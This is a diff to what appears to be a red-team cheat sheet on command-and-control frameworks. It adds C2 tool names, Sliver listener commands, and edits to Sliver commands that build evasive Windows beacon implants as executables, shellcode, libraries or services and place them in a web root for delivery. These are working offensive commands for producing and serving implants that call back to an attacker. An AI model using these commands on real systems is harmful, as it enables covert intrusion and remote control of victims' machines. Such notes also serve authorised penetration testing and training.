@@ -2650,6 +2650,8 @@ Common C2:
 - silenttrinity (byt3bl33d3r)
 - Sliver (BishopFox)
 - Merlin
+- Nighthawk
+- HardHat
 - Covenant
 - Cobalt Strike
 - Havoc
@@ -2662,14 +2664,20 @@ Start Sliver Server:
 sudo systemctl start sliver
 ```
 
+Listeners
+```
+mtls -l <port>
+https
+```
+
 Generate Profile
 ```
-profiles new beacon --arch amd64 --os windows --mtls 10.10.10.10:443 -f shellcode --evasion --timeout 300 --seconds 5 --jitter 1 RED_LAKE
+profiles new beacon --arch amd64 --os windows --mtls [ip:port] -f shellcode --evasion --timeout 300 --seconds 5 --jitter 1 RED_LAKE
 ```
 
 Generate Beacons:
 ```
-generate beacon --evasion --arch amd64 --mtls [ip] --format [exe,shellcode,shared,service] --os windows --save /var/www/html 
+generate beacon --evasion --arch amd64 --mtls [ip:port] --format [exe,shellcode,shared,service] --os windows --save /var/www/html 
 ```
 
 Convert to Shellcode to PowerShell Payload (Unstable):
